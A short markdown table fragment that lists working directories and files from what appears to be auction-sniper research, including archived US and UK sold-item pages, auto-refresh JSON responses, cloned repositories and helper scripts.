| `/var/tmp/sniper-research/wayback/live_dec/20260123010506_127622190770.html` | US sold page |
| `/var/tmp/sniper-research/wayback/live_dec/20260105125151_177654722949.html` | UK sold page |
| `/var/tmp/sniper-research/wayback/snaps_dec/` | 80+ UK item pages 2025-06 to 2026-02 (BIN and ended auctions) |
| `/var/tmp/sniper-research/wayback/autorefresh_dec/` | AUTO_REFRESH JSON responses |
| `/var/tmp/sniper-research/src/` | cloned repos (read only) |
| `/var/tmp/sniper-research/myscripts/` | `extract_module.py` (brace-balanced module extractor), `scan_item.py`, `ctx.py` |
